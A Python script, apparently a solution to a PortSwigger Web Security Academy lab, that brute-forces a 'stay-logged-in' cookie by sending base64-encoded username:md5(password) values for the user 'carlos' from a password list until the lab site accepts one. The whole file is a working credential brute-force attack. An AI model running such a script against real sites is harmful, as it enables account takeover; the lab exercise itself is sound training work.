# This script was written to complete the lab https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie. 
#   This lab has an unencrypted stay logged in cookie that can be used to access other account information


import requests
from base64 import b64encode
from hashlib import md5
from bs4 import BeautifulSoup


def main():
  DOMAIN = "0a38007404f2bc40c0a877d70015001b.web-security-academy.net"
  URL = f"https://{DOMAIN}/my-account"
  SESSION_COOKIE = "iit8wdQThtGJKYBZQH9pythlwXYSHnkk"
  USERNAME = "carlos"

  passwords_file = open("passwords.txt", "r")
  passwords = passwords_file.read().split("\n")
  passwords_file.close()

  print("testing passwords...")

  for password in passwords:
    payload = f"{USERNAME}:" + str(md5(password.encode()).hexdigest())
    base64_payload = b64encode(payload.encode('ascii')).decode('ascii')
    headers = {"Cookie": f"stay-logged-in={base64_payload}; session={SESSION_COOKIE}"}
    response = requests.post(URL, headers = headers, allow_redirects=False)
    if response.status_code == 200:
      print(f"found the password: {password}")
      return

  print("could not find the password")
  return


if __name__ == "__main__":
  main()
